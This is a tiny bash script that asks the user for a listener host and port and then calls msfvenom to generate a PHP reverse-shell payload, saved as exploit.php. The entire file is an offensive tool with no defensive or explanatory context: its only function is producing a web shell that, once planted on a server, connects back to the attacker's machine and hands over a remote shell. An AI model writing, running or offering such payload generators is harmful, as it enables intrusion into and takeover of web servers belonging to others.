#!/bin/bash

read -p "LPORT: " PORT

read -p "LHOST: " HOST

msfvenom -p php/reverse_php lport=$PORT lhost=$HOST > exploit.php
